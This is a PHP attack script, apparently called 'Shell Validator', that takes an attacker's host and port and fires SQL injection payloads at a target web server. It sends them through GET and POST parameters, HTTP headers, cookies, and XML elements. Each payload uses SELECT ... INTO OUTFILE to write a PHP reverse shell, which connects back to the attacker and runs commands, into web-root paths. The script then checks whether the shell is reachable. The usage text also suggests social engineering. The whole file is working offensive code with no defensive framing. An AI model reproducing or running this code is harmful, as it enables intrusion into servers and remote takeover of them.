<?php
echo"                ____  _   _ _____ _     _                            \n";
echo"         __/\__/ ___|| | | | ____| |   | |                           \n";
echo"         \    /\___ \| |_| |  _| | |   | |                           \n";
echo"         /_  _\ ___) |  _  | |___| |___| |___                        \n";
echo"           \/  |____/|_| |_|_____|_____|_____|                       \n";
echo"                                                                     \n";
echo"        __     ___    _     ___ ____    _  _____ ___  ____           \n";
echo"        \ \   / / \  | |   |_ _|  _ \  / \|_   _/ _ \|  _ \__/\__    \n";
echo"         \ \ / / _ \ | |    | || | | |/ _ \ | || | | | |_) \    /    \n";
echo"          \ V / ___ \| |___ | || |_| / ___ \| || |_| |  _ </_  _\    \n";
echo"           \_/_/   \_\_____|___|____/_/   \_\_| \___/|_| \_\ \/      \n";
echo"                                                                     \n";
echo"                                                                     \n";
echo"                                                By: Unnknown AD -_-  \n";
$lhost=readline("Shell Validator > lhost :");
$lport=readline("Shell Validator > lport :");
$wordlist=array("/var/www/html/shell_magnify.php","c:/wamp/www/shell_magnify.php");
$http_file_interaction=0;
if(strpos(implode(" ",$argv),"--headers-file")){
  echo "[+] using http file interactive mode ...\n";
  $http_file_interaction=1;
  setup_http_injection($argv[2]);
}
if((!isset($argv[3])))
  {
    if($http_file_interaction==0){
    echo "[*] usage :\n

$ default sql backdoor => mysql.php <url> <method> <param1::param2::>\n

$ headers injection => mysql.php --headers-file <your file> \n

$ xml tags injection => mysql.php <url> --xml-file <your xml source code file goes here>

NOTES : use wireshark or burpsuite to gather received http headers (it must includes headers only) !!
        
use social engineering to get the xml code (it counts on you)    \n\n";
    exit;
}}
    else{
            $url=explode("/",$argv[1]);
            $hostname=$url[0];
            echo $hostname;
            unset($url[0]);
            $index="/".implode('/',$url);
            $method=$argv[2];
            $param=$argv[3];
            echo "[!] Start Bruteforcing... \n";
}
if ($argv[2]=="--xml-file"){
  $xmld=fopen($argv[3],"r");
  xml_injection(fread($xmld,1024));
  fclose($xmld);
}
// XML INJECTION BLOCK
function xml_injection($file){
  global $wordlist,$lhost,$lport;
  
  $xmlbody=<<<XML
  <?xml version="1.0" encoding="ascii"?>
  XML;
  global $wordlist,$lhost,$lport;
  $browser=new DOMDocument();
  $browser->loadXML($file);
  $parentnode=$browser->doctype->nodeName;
  echo "[-] Inintializing node names ...\n";
  $childnodes=array();
  $newchild=$browser->createElement("test","blablabla");
  $browser->appendChild($newchild);
  //echo $browser->saveXML();
  foreach($browser->getElementsByTagName("*") as $node){ 
    echo '$ '.$node->nodeName."\n";
     array_push($childnodes,$node->nodeName);
    }
    //print_r($childnodes);
    $xmlpayload=<<<XML
    <?xml version="1.0" encoding="ascii"?>
    <!DOCTYPE $parentnode [
    XML;
    foreach($childnodes as $child){
           $xmlpayload.="\n<!ELEMENT $child ANY>\n";
    }
    $xmlpayload.="]>";
    $xmlpayload.="<$parentnode>";
    $xmlpayload1=$xmlpayload;
    foreach($wordlist as $p){
      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
      foreach($cmd as $c){
    foreach($childnodes as $childnode){
      if ($childnode !==$parentnode){
      $xmlpayload.="<$childnode>$c</$childnode>";
    }}
    $xmlpayload.="</$parentnode>";
    echo "\n$xmlpayload";
    $xserver=socket_create(AF_INET,SOCK_STREAM);
    $xmlpayload=$xmlpayload1;
  }}}
           /// HEADERS INJECTION
function fetch_parameters($method,$line,$default="null"){
if ($method=="GET"){
  return explode("=",explode("?",str_replace(' HTTP/1.1',"",str_replace("GET ","",$line)))[1])[0];
}else{
  return explode("\n\n",$default)[1];
}
}
function setup_http_injection($file){
$cookies_list=array();
$user_agent="";
$headers_file=fopen($file,"r") or die("[!] can't find $file");
$array=explode("\n",fread($headers_file,20000));
$addition=array();
foreach($array as $item){
  if (strpos($item,"HTTP/1.1")){
    $index=str_replace(" HTTP/1.1",'',str_replace("GET ","",$item));
    echo "[!] Index detected : $index\n";
    if (strpos($item,"?")){
      $method="GET";
    }else{$method="POST";}
    echo "[!] Request Method : $method \n";
    $data=fetch_parameters($method,$item,implode("\n",$array))."\n";
    echo "[!] request parameter: ".$data;
  }
  if(strpos($item,":")){
    $line=explode(':',$item);
    if($line[0]=="Host"){
      $target_host=$line[1];
      echo "[!] Target Host Detected: $line[1]\n";
    } if($line[0]=="Cookie"){
      $cookies_line=$line[1];
      $cookies_list=use_cookies($cookies_line);
      foreach($cookies_list as $e=>$fc){
      echo "[!] Cookies Detected: ".$fc."\n";}
      $cookie=true;
    }
  if($line[0]=="User-Agent"){
    echo "[!] User Agent Header Detected\n";
  }
  else{
   $addition[$line[0]]="Null";
  }
}
}
http_attack($target_host,$index,$method,$cookies_list,$addition);
fclose($headers_file);
}
function use_cookies($cookies){
  $fetched_cookies=array();
  if(strpos($cookies,";")){
    foreach(explode(";",$cookies) as $x){
  $name=explode("=",$x)[0];
  array_push($fetched_cookies,str_replace(" ","",$name)) ;   // ex : name=%22Unknown ad%22
}
  return $fetched_cookies;
}else{
return array(explode("=",$cookies)[0]);
  }
}
function http_attack($host,$index="/",$method,$cookies="",$addition=array()){
      global $wordlist,$lhost,$lport;
      unset($addition["User-Agent"]);
      unset($addition["Host"]);
      unset($addition["Connection"]);
      if ($cookies!=""){
        unset($addition["Cookie"]);
      }
      $host=str_replace(" ","",$host);
      foreach($wordlist as $p){
        $p=str_replace("\n","",$p);
        $p="\"$p\"";
      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; \"","b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost'".",$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile $p#");
      foreach($cmd as $command){
      $blank_="";
      $cookies_values="";
      foreach($cookies as $cookie){
      $cookies_values=$cookies_values.$cookie."=".urlencode($command).";";
          }
      if ($method=="GET"){
        $blank_=$blank_."$method $index"." HTTP/1.1\r\nHost: $host\r\nUser-Agent:$command\r\nCookie:$cookies_values"."\r\n";
      }

      if($addition!=array()){
        foreach(array_keys($addition) as $foreigne_header){
          $blank_.="$foreigne_header :.".urlencode($command)."\r\n";
        }
      }
      $blank_=$blank_."Connection: Close\r\n\r\n";
      $insidious=socket_create(AF_INET,SOCK_STREAM,0);
      socket_connect($insidious,$host,80);
      socket_write($insidious,$blank_);
      socket_close($insidious);
      make_sure($host,$p);
    }}
}
              function make_sure($hostname,$p){
                if (shell_exec("php verify.php ".$hostname)=='1')
                  {
                    echo "[+] found : $p \n";exit;
                }else{
                    echo "[+] failed: $p\n";
                  }
              }
function get($param,$w){
    global $index;
    global $cmd;
    global $hostname,$method,$lhost,$lport;
    foreach($w as $p){
      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
      ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
        foreach($cmd as $command){
            $api=socket_create(AF_INET,SOCK_STREAM,0);
            socket_connect($api,$hostname,80) or die('unable to reach the target host');
            $request="GET $index?".implode(urlencode($command)."&",$param)." HTTP/1.1\r\nHost: ".$hostname."\r\nConnection: Close\r\n\r\n";
            socket_write($api,$request);
            socket_close($api);
            make_sure($hostname,$p);
            }

      }}
function post($param,$w){
  global $index;
  global $cmd;
  global $hostname,$method,$lhost,$lport;
  foreach($w as $p){
  $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
      foreach($cmd as $command){
          $api=socket_create(AF_INET,SOCK_STREAM,0);
          socket_connect($api,$hostname,80) or die('unable to reach the target host');
          echo "bug";
          $request="POST $index HTTP/1.1\r\nHost: $hostname\r\nContent-Length: ".strlen(implode($command."&",$param))."\r\nContent-Type:application/x-www-form-urlencoded"."\r\nConnection: Close\r\n\r\n".implode($command."&",$param);
          echo $request;
          echo $request;
          socket_write($api,$request);
          socket_close($api);
          make_sure($hostname,$p);
          }
    }
  }
if ($argv[2]=='GET'){
  if (strpos($param,"::")){
    $node=explode("::",$param);
    foreach($node as $primarykey=>$noditem){
      $node[$primarykey]=$noditem."=";
    }
    get($node,$wordlist);
  }
}else{
  if (strpos($param,"::")){
    $node=explode("::",$param);
    foreach($node as $primarykey=>$noditem){
      $node[$primarykey]=$noditem."=";
    }
    print_r($node);
    post($node,$wordlist);
  }}
?>
